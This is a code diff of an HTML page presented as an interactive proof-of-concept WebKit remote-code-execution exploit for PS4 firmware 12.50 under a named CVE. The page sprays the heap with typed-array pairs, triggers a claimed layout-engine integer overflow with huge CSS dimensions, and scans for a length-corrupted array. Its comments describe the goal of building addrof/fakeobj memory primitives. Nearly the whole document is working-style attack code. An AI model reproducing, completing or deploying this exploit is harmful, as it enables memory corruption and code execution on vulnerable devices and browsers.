@@ -1,43 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ps4 12.50 webkit rce (cve-2025-43431 PoC)</title>
-    <style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;}</style>
+    <title>ps4 12.50 webkit rce (interactive PoC)</title>
+    <style>
+        body { background:#0d1117; color:#c9d1d9; font-family:monospace; font-size:14px; }
+        #log { background:#000; border:1px solid #333; height:400px; overflow-y:scroll; padding:10px; margin-bottom:10px; white-space:pre-wrap; }
+        button { background:#da3633; color:#fff; border:none; padding:10px; margin:5px; font-family:monospace; cursor:pointer; }
+        button:disabled { background:#555; }
+        .error { color: #ff5555; }
+        .success { color: #55ff55; }
+    </style>
 </head>
 <body>
-<h1>ps4 12.50 webkit rce (cve-2025-43431 PoC)</h1>
-<pre id="log"></pre>
+    <h1>interactive PoC - cve-2025-43431</h1>
+    <div id="controls">
+        <button id="btn_groom" onclick="run_stage1()">1. groom heap</button>
+        <button id="btn_trigger" onclick="run_stage2()" disabled>2. trigger corruption</button>
+        <button id="btn_hunt" onclick="run_stage3()" disabled>3. hunt for victim</button>
+    </div>
+    <pre id="log"></pre>
 <script>
-const log = (msg) => document.getElementById('log').innerText += `[+] ${msg}\n`;
+const log_div = document.getElementById('log');
+const log = (msg, type = '') => {
+    log_div.innerHTML += `<span class="${type}">[${performance.now().toFixed(2)}ms] ${msg}\n</span>`;
+    log_div.scrollTop = log_div.scrollHeight;
+};
 
-// --- stage 1: heap feng shui ---
-// we're spraying objects that contain two adjacent arrays.
-// the goal: the layout bug corrupts the metadata of the float_arr,
-// allowing us to control its backing store pointer and length.
-// we then point it at the obj_arr to get addrof/fakeobj.
-log("stage 1: grooming heap with 0x4000 victim pairs...");
-const victim_spray = [];
-for (let i = 0; i < 0x4000; i++) {
-    victim_spray[i] = [new Float64Array(1), [{}]]
+let victim_spray = [];
+let corrupted_primitives = null;
+
+function run_stage1() {
+    try {
+        log("stage 1: grooming heap with 0x4000 victim pairs...");
+        for (let i = 0; i < 0x4000; i++) {
+            victim_spray[i] = [new Float64Array(1), [{}]]
+        }
+        log("grooming complete. heap is prepped.", "success");
+        document.getElementById('btn_groom').disabled = true;
+        document.getElementById('btn_trigger').disabled = false;
+    } catch (e) {
+        log(`stage 1 failed: ${e.message}`, "error");
+    }
 }
 
-// --- stage 2: the sledgehammer ---
-// trigger the webcore layout bug. this causes an integer overflow
-// during layout calculation, resulting in a small allocation with a huge
-// size, leading to an out-of-bounds write.
-log("stage 2: triggering layout engine corruption (cve-2025-43431)...");
-const div = document.createElement('div');
-div.style.cssText = `width: ${Math.pow(2, 31) - 1}px; height: ${Math.pow(2, 31) - 1}px; position: fixed;`;
-document.body.appendChild(div);
-// force reflow to trigger the bug. the browser now attempts to process this absurdity.
-div.offsetWidth;
-log("trigger sent. the heap is likely... messy.");
+function run_stage2() {
+    try {
+        log("stage 2: triggering layout engine corruption (cve-2025-43431)...");
+        const div = document.createElement('div');
+        div.style.cssText = `width: ${Math.pow(2, 31) - 1}px; height: ${Math.pow(2, 31) - 1}px; position: fixed;`;
+        document.body.appendChild(div);
+        div.offsetWidth; // Force reflow
+        log("trigger sent. if browser hasn't crashed, proceed to hunt.", "success");
+        document.getElementById('btn_trigger').disabled = true;
+        document.getElementById('btn_hunt').disabled = false;
+    } catch (e) {
+        log(`stage 2 failed: ${e.message}`, "error");
+    }
+}
 
-// --- stage 3: the hunt ---
-// now we sift through the wreckage. we're looking for a Float64Array
-// whose length has been changed from 1 to something ridiculously large.
-log("stage 3: hunting for the corrupted array...");
-let corrupted_float_arr = null;
-let adjacent_obj_arr = null;
+function run_stage3() {
+    try {
+        log("stage 3: hunting for corrupted array...");
+        let found = false;
+        for (let i = 0; i < victim_spray.length; i++) {
+            // Check if the object is still valid before accessing properties
+            if (!victim_spray[i] || !victim_spray[i][0]) continue;
+            
+            let arr_len = 0;
+            try {
+                arr_len = victim_spray[i][0].length;
+            } catch(e) {
+                log(`error accessing length at index ${i}: ${e.message}`, "error");
+                continue;
+            }
 
-for (let i = 0; i < victim_spray.length; i++) 
+            if (arr_len > 1) {
+                log(`!!! VICTIM FOUND at index ${i} !!!`, "success");
+                log(`corrupted length: ${arr_len}`, "success");
+                found = true;
+                // In a real scenario, we'd now build primitives here.
+                // For now, we just confirm we found it.
+                alert("CORRUPTION SUCCESSFUL! Check logs for details.");
+                break;
+            }
+        }
+        if (!found) {
+            log("hunt failed. no corrupted array found. heap was uncooperative.", "error");
+            alert("Exploit failed. Refresh and try again.");
+        }
+        document.getElementById('btn_hunt').disabled = true;
+    } catch (e) {
+        log(`stage 3 failed: ${e.message}`, "error");
+    }
+}
+</script>
+</body>
+</html>
